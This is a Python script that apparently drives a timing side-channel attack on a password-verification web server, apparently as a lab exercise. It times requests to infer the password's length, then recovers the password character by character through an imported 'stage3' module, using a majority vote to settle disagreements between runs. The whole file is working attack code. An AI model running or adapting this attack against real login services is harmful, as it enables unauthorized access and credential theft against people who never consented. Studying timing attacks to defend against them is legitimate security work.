import http.client
import pprint
import time
import sys
import stage3
#URL = '127.0.0.1:5000'
#URL='10.0.0.4:5000'
URL='192.168.43.127:5000'

#URL="verifyserver.herokuapp.com"

def majorityVote(candidates):
    psf=''
    inx=0
    outleiers=[]
    for i in candidates[0]:
        if i==candidates[1][inx]:
            psf+=i
        else:
            psf+='_'
            outleiers.append([i,candidates[1][inx]])

        inx+=1
    return [outleiers,psf]

def getURLparam(psf):
    return "/index/test/" +psf
    
def getPassLength():
    longestTime = -1
    bestLenght = -1
    
    st3=stage3.Stage3(URL)
    for i in range(32,1,-1):
        temp=''
        temp= temp.rjust(i,'a')
       
        sample_num = 6
        minTime = sys.maxsize
       
        for a in range (sample_num):
            s = st3.sendRequest2(temp)
            
            if s[0] < minTime:
                minTime = s[0]
        
        avg = minTime
        print("Length: " + str(i) + " took " + str(avg) + " for " +str( sample_num)+" samples")
        if avg > longestTime:
            longestTime = avg
            bestLenght = i
            

        
    
    print("\n.....\nBest length " + str(bestLenght )+ " time was: " +str(longestTime))
    return bestLenght
	
	
def main():
    passwordCandidates=[]
    k =  getPassLength()
    print ("password detected length :",k)
    print("according to timing attack pass length is " , k)
    
    stg3=stage3.Stage3(URL)
    '''
    passwordCandidates.append('HASODTHLI')
    passwordCandidates.append('HAAODSHLI')
    redoList= majorityVote(passwordCandidates)
    print (redoList)
    foundPass=stg3.redo(redoList)
    '''
    foundPass = stg3.findPass3(k)
    
    print("found password :",foundPass[0],"confirmed: ",foundPass[1])
    
    if foundPass[1]=='0':
        passwordCandidates.append(foundPass[0])
        foundPass = stg3.findPass3(k)
        if foundPass[1]=='0':
            passwordCandidates.append(foundPass[0])
            redoList= majorityVote(passwordCandidates)
            print (redoList)
            foundPass=stg3.redo(redoList)
            print("found password :",foundPass[0],"confirmed: ",foundPass[1])  

        else:
          print("found password :",foundPass[0],"confirmed: ",foundPass[1])  
        

if __name__== '__main__':
    main()

